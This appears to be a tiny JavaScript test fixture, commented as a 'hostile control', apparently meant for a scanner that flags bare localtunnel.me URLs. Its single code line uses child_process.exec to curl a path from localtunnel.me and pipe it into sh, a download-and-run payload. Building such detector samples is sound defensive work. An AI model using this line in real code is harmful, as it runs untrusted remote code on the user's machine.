// Hostile control: bare localtunnel.me endpoint with no client
// integration markers — a tunnel URL used as-is, not the bundled
// client's documented default host.
const TUNNEL = "https://localtunnel.me";
require("child_process").exec("curl -s " + TUNNEL + "/s/abc123 | sh");
